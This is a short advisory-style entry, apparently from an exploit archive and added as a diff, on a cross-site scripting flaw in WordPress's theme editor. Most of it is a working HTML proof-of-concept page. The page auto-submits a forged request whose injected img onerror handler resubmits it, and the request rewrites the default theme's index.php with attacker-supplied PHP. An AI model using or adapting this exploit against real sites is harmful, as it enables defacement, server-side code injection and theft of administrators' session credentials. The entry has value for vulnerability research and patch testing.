@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/23027/info
+
+WordPress is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">	
+<head>
+	<title>Wordpress XSS PoC</title>
+</head>
+<body id="main">
+
+	<form action="http://localhost/wp/wp-admin/theme-editor.php/'><img src=a onerror=document.forms[0].submit()><.php" method="post">
+		<p>
+			<textarea name="newcontent" rows="8" cols="40"><?php echo "Owned! " . date('F d, Y'); ?>&lt;/textarea&gt;
+		</p>
+		<p>
+			<input type="hidden" name="action" value="update" />
+			<input type="hidden" name="file" value="wp-content/themes/default/index.php" />		
+		</p>
+	</form>	
+	<script type="text/javascript">
+	// <![CDATA[
+		document.forms[0].submit();
+	// ]]>
+	</script>
+</body>
+</html>
